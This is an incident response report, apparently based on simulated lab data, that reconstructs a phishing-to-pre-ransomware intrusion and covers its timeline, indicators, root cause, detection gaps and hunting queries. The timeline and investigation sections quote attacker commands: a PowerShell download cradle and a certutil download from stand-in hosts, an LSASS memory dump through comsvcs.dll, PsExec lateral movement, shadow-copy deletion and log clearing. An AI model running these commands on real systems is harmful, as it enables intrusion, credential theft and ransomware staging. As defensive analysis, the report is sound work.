# IR-2026-001: Phishing to Pre-Ransomware Staging

| | |
|---|---|
| **Status** | Closed (contained before encryption) |
| **Severity** | Critical (P1) |
| **Analyst** | YOUR_NAME |
| **Detected** | 2026-10-20 09:12 UTC (alert ALR-1002) |
| **Contained** | 2026-10-20 10:11 UTC |
| **Time to contain** | 59 minutes from first alert |
| **Affected hosts** | WS-FIN-07 (finance workstation), SRV-FILE-01 (file server) |
| **Affected accounts** | `CORP\j.rahman`, `CORP\svc_backup` |
| **Data source** | Simulated lab data, see [`triage-tool/samples/sample_alerts.json`](../triage-tool/samples/sample_alerts.json) |

> All names, IPs (RFC 5737) and hashes are fictional lab data.

---

## 1. Executive summary

A finance employee opened a macro-enabled Word document delivered by email. The macro ran a
hidden, encoded PowerShell command that downloaded a loader (`svch.exe`) and made it persistent.
Over the next 40 minutes the attacker enumerated the domain, dumped credentials from memory,
and used a stolen backup service account to move to the finance file server with PsExec. On
the server, the attacker created a scheduled task, **deleted all Volume Shadow Copies** and
**cleared the Security log**, classic steps immediately before ransomware deployment.

Both hosts were isolated 8 minutes after the shadow-copy deletion alert. No file encryption or
data exfiltration was observed. The `svc_backup` and `j.rahman` credentials were reset.

## 2. Timeline (UTC)

| Time | Host | Event | Evidence | ATT&CK |
|---|---|---|---|---|
| 09:12:04 | WS-FIN-07 | `WINWORD.EXE` spawns `powershell.exe -nop -w hidden -enc …` | ALR-1002, ALR-1003 | T1566.001, T1204.002, T1059.001, T1027 |
| 09:12:04 | WS-FIN-07 | Decoded payload: `IEX (New-Object Net.WebClient).DownloadString('http://update-cdn.example/stage1.ps1')` | triage-tool decode | T1059.001 |
| 09:12:40 | WS-FIN-07 | `certutil -urlcache -split -f http://198.51.100.23/svch.exe C:\Users\Public\svch.exe` | ALR-1004 | T1105, T1218 |
| 09:14:10 | WS-FIN-07 | Run key `SvcHostHelper` → `C:\Users\Public\svch.exe` | ALR-1005 | T1547.001 |
| 09:20:33 – 09:21:30 | WS-FIN-07 | `whoami /all`, `net group "domain admins" /domain`, `nltest /domain_trusts` (parent: `svch.exe`) | ALR-1006 – 1008 | T1033, T1087.002, T1482 |
| 09:35:12 | WS-FIN-07 | `rundll32 comsvcs.dll, MiniDump 712 C:\Users\Public\d.dmp full`: LSASS memory dumped | ALR-1009 | T1003.001, T1218.011 |
| 09:52:47 | WS-FIN-07 | `PsExec64.exe \\SRV-FILE-01 -s cmd.exe` as `CORP\svc_backup` | ALR-1010 | T1021.002, T1569.002 |
| 09:52:49 | SRV-FILE-01 | `PSEXESVC.exe` → `cmd.exe` as SYSTEM | ALR-1011 | T1021.002 |
| 09:55:03 | SRV-FILE-01 | Scheduled task `MicrosoftEdgeUpdateCore` → `C:\ProgramData\svch.exe` at logon as SYSTEM | ALR-1012 | T1053.005 |
| 10:03:41 | SRV-FILE-01 | `vssadmin delete shadows /all /quiet` | ALR-1013 | T1490 |
| 10:04:15 | SRV-FILE-01 | Security log cleared (Event 1102) | ALR-1014 | T1070.001 |
| 10:05 | — | triage-tool groups alerts into INC-001 / INC-002 (both P1, linked); analyst escalates | triage report | |
| 10:11 | — | Both hosts network-isolated via EDR; `svc_backup` disabled | containment | |

**Dwell time from first execution to impact-stage activity: 51 minutes.**

## 3. Investigation details

### 3.1 Initial access and execution
The parent-child pair `WINWORD.EXE → powershell.exe` has no legitimate business reason on a
finance workstation. The PowerShell arguments `-nop -w hidden -enc` (no profile, hidden window,
encoded command) are a strong malicious indicator on their own. Decoding the Base64 (UTF-16LE)
blob revealed a download cradle pulling a second-stage script from `update-cdn.example`.

The Word document's SHA-256 (`e8beeb60…814e6e`) had no threat-intel hits. That's expected for a
freshly generated phishing document, so the absence of hits was **not** treated as evidence of safety.

### 3.2 Payload and persistence
`certutil.exe`, a signed Windows binary, was abused to download `svch.exe` from
`198.51.100.23`. The file name imitates `svchost.exe` but lives in `C:\Users\Public\`, a
location Windows system binaries never run from. A Run-key value with a plausible name
(`SvcHostHelper`) gave it persistence at user logon.

### 3.3 Discovery
Three reconnaissance commands within 60 seconds, all spawned by `svch.exe`, show hands-on-keyboard
activity rather than a user troubleshooting. Individually these are low-severity alerts; the
triage tool scored them 15 each but they raised the incident score via tactic progression.

### 3.4 Credential access
The attacker dumped LSASS (PID 712) using the `MiniDump` export of `comsvcs.dll` through
`rundll32.exe`. This gives access to the NTLM hashes and possibly cleartext credentials of every
account logged on to WS-FIN-07, including `svc_backup`, which had an interactive session
from an earlier backup troubleshooting ticket.

### 3.5 Lateral movement and impact preparation
With `svc_backup` (local admin on file servers), the attacker ran PsExec to SRV-FILE-01 as
SYSTEM, created a scheduled task to relaunch the loader, deleted shadow copies to prevent
recovery, and cleared the Security log. This sequence matches common pre-encryption playbooks.

## 4. Indicators of compromise

| Type | Value | Context |
|---|---|---|
| Domain | `update-cdn.example` | Stage-1 PowerShell download |
| URL | `http://update-cdn.example/stage1.ps1` | Download cradle target |
| IP | `198.51.100.23` | Hosted `svch.exe` |
| URL | `http://198.51.100.23/svch.exe` | certutil download |
| SHA-256 | `783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b` | `svch.exe` loader |
| SHA-256 | `e8beeb60a46d78a58413bdb0c48e9af0d9092f44c01851e666b93e848e814e6e` | Phishing document |
| File | `C:\Users\Public\svch.exe`, `C:\ProgramData\svch.exe` | Loader copies |
| File | `C:\Users\Public\d.dmp` | LSASS dump |
| Registry | `HKU\…\CurrentVersion\Run\SvcHostHelper` | Persistence |
| Scheduled task | `MicrosoftEdgeUpdateCore` | Persistence on SRV-FILE-01 |

Machine-readable list: [`triage-tool/examples/sample_run/iocs.csv`](../triage-tool/examples/sample_run/iocs.csv).

## 5. Scope and impact

- **Confirmed compromised:** WS-FIN-07, SRV-FILE-01, accounts `j.rahman` and `svc_backup`.
- **Fleet hunt:** searched all endpoints for the loader hash, `C:\Users\Public\*.exe`, the task
  name, and connections to the two network IOCs. No other hosts affected.
- **Data:** no large outbound transfers in proxy logs during the window; no encryption observed.
- **Business impact:** the file server was offline for 6 hours during rebuild; restored from offline backup.

## 6. Response actions

| Phase | Action |
|---|---|
| **Containment** | Isolated both hosts via EDR; disabled `svc_backup`; blocked domain/IP at proxy, DNS and firewall |
| **Eradication** | Collected memory and disk images; removed Run key and scheduled task; reimaged WS-FIN-07 |
| **Recovery** | Rebuilt SRV-FILE-01 and restored shares from the offline backup; reset passwords for both accounts and every account with a session on WS-FIN-07 |
| **Post-incident** | Reported the phishing email; purged it from 14 other mailboxes; user awareness follow-up |

## 7. Root cause

1. Office macros from internet-sourced documents were allowed to run.
2. A privileged service account (`svc_backup`) logged on interactively to a workstation,
   leaving reusable credentials in LSASS.
3. The service account had local admin rights on every file server (no tiering).

## 8. Detection review and lessons learned

| What worked | What didn't |
|---|---|
| Ten different rules fired across the kill chain, so no single rule was a single point of failure | **Detection gap:** `proc_access_win_lsass_memory_access` did *not* fire. Its filter excludes any `SourceImage` under `C:\Windows\System32\`, and `rundll32.exe` lives there. The attacker's LOLBin technique slipped through. |
| Triage tool linked the two hosts automatically (lateral movement + shared hash) | Discovery alerts are low severity and would likely be ignored in a busy queue without correlation |
| Decoding the PowerShell in triage revealed the C2 domain within seconds | 51 minutes elapsed before isolation; an automated containment playbook for `T1490` would cut this |

**Fixes made:**
- Kept the LSASS-access filter (it removes a lot of noise) and added the dedicated
  [`proc_creation_win_lsass_dump_comsvcs`](../detections/sigma/proc_creation_win_lsass_dump_comsvcs.yml)
  rule, so this technique is now caught on the command line too.
- Documented the change in the [tuning log](../attack-mapping.md#tuning-log).

## 9. Recommendations

1. Block macros in Office files from the internet (Microsoft 365 policy / GPO).
2. Enable **LSA Protection (RunAsPPL)** and **Credential Guard** on workstations.
3. Implement an admin tiering model: service accounts must not log on to workstations.
4. Alert on any PsExec use outside a named admin group; long term, restrict SMB between workstations.
5. Auto-isolate hosts on shadow-copy deletion via SOAR.

## 10. Appendix: hunting queries used

```spl
# Every process spawned by the loader (Splunk, Sysmon)
index=windows sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
  ParentImage="*\\svch.exe"
| table _time host User Image CommandLine
```

```spl
# Any host contacting the network IOCs
index=proxy (dest="update-cdn.example" OR dest_ip="198.51.100.23")
| stats count min(_time) as first max(_time) as last by src_ip, dest
```
